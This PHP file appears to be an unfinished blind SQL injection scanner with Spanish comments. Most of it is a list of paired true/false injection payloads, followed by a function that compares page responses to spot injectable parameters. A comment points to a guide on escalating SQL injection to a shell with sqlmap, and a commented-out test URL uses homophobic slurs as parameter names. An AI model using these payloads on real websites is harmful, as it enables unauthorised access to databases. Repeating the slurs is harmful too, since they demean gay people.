<?php



#jose%'/**/AND/**/7688=7688/**/AND/**/'%'='
$payload=array( 	array(" and 0x31=0x30"," and 0x31=0x31"),
					array(" and false--+-"," and true--+-"),
					array("' and 0x31=0x30","' and 0x31=0x31"),
					array("' and 0x31=0x30--+-","' and 0x31=0x31--+-"),
					array(" and false"," and true"),
					array("' and false and '0x31'='0x31","' and true and '0x31'='0x31"),
					array("' and false and '0x31'='0x31--+-","' and true and '0x31'='0x31--+-"),
									
									
					array(") and false--+-",") and true--+-"),
					array(") and false",") and true"),
					array("') and false and '0x31'='0x31","') and true and '0x31'='0x31"),
					array("') and false and '0x31'='0x31--+-","') and true and '0x31'='0x31--+-"),
					array("') and 0x31=0x30","') and 0x31=0x31"),

					array(")) and false--+-",")) and true--+-"),
					array(")) and false",")) and true"),
					array("')) and false and '0x31'='0x31","')) and true and '0x31'='0x31"),
					array("')) and false and '0x31'='0x31--+-","')) and true and '0x31'='0x31--+-"),
					array("')) and 0x31=0x30","')) and 0x31=0x31"),
									
					array(") and (false--+-",") and (true--+-"),
					array(") and (false",") and (true"),
					array("') and false and ('0x31'='0x31","') and true and ('0x31'='0x31"),
					array("') and false and ('0x31'='0x31--+-","') and true and ('0x31'='0x31--+-"),
									

					array(")) and (false--+-",")) and ((true--+-"),
					array(")) and ((false",")) and ((true"),
					array("')) and false and (('0x31'='0x31","')) and true and (('0x31'='0x31"),
					array("')) and false and (('0x31'='0x31--+-","')) and true and (('0x31'='0x31--+-"),
					array("')) and false and ((0x31=0x31","')) and true and ((0x31=0x31"),
					/*
					array(",false,false)--+-",",true,true)--+-"),
					array(",false,false)",",true,true)"),
					array(",false,false))--+-",",true,true))--+-"),
					array(",false,false))",",true,true))"),

					array(") THEN false ELSE false END--+-",") THEN true ELSE true END--+-"),
					array(") THEN false ELSE false END)--+-",") THEN true ELSE true END)--+-"),

					array("') THEN false ELSE false END--+-","') THEN true ELSE true END and '0x31'='0x31--+-"),
					array("') THEN false ELSE false END--+-","') THEN true ELSE true END and--+-"),
					array("') THEN false ELSE false END--+-","') THEN true ELSE true END and"),
					array("') THEN false ELSE false END)--+-","') THEN true ELSE true END)  and '0x31'='0x31--+-"),
					*/
					array(' and false--+-',' and true--+-'),
					array(' and false',' and true'),
					array('" and false and "0x31"="0x31','" and true and "0x31"="0x31'),
					array('" and false and "0x31"="0x31--+-','" and true and "0x31"="0x31--+-'),
					array('" and 0x31=0x30','" and 0x31=0x31'),
									
					array(') and false--+-',') and true--+-'),
					array(') and false',') and true'),
					array('") and false and "0x31"="0x31','") and true and "0x31"="0x31'),
					array('") and false and "0x31"="0x31--+-','") and true and "0x31"="0x31--+-'),
					array('") and 0x31=0x30','") and 0x31=0x31'),

					array(')) and false--+-',')) and true--+-'),
					array(')) and false',')) and true'),
					array('")) and false and "0x31"="0x31','")) and true and "0x31"="0x31'),
					array('")) and false and "0x31"="0x31--+-','")) and true and "0x31"="0x31--+-'),
					array('")) and 0x31=0x30','")) and 0x31=0x31'),
									
					array(') and (false--+-',') and (true--+-'),
					array(') and (false',') and (true'),
					array('") and false and ("0x31"="0x31','") and true and ("0x31"="0x31'),
					array('") and false and ("0x31"="0x31--+-','") and true and ("0x31"="0x31--+-'),
					array('") and false and (0x31=0x31','") and true and (0x31=0x31'),

					array(')) and (false--+-',')) and ((true--+-'),
					array(')) and ((false',')) and ((true'),
					array('")) and false and (("0x31"="0x31','")) and true and (("0x31"="0x31'),
					array('")) and false and (("0x31"="0x31--+-','")) and true and (("0x31"="0x31--+-'),
					array('")) and false and ((0x31=0x31','")) and true and ((0x31=0x31')


#0%' AND 8329=8329 AND '%'='
			);

#leeer=http://calebbucker.blogspot.mx/2013/01/sql-injection-to-shell-with-sqlmap.html
#LOS ERRRORES CON se deben de checar con or y and 

#para mejorar la velocidad se puede utilizar las  expreciones reculares para comparar 


#print_r($payload);

	function enlase($link)
	{
		print_r(   explode("&", $link));
		
		#implode("&",);
	}

#enlase("http://127.0.0.1/sql_injeccion_por_get/tienda.php?ramona=20&page_id=1&chingon=nada&id_producto=1&php=300&pedro=1&maricon=2&joto=3");


	function estatico($pagina1,$pagina2,$paginaError,$XSS=null)
	{

		$varArray= compararTexto($pagina1,$paginaError)[1];
		if(coincidenciaTexto($varArray,$pagina2))
		{
			echo "\nSE ENCONTRO CONSIDENCIAS";
		}
		else
		{
			echo "\nNOOOOOOOOOOO SE ECONTRARON CONSIDENCIAS";
		}

		if(coincidenciaTexto($varArray,$paginaError))
		{
			echo "\nSE ENCONTRO CONSIDENCIAS";
		}
		else
		{
			echo "\nNOOOOOOOOOOO SE ECONTRARON CONSIDENCIAS";
		}

	}

	#armandovulneratuwebo@yopmail.com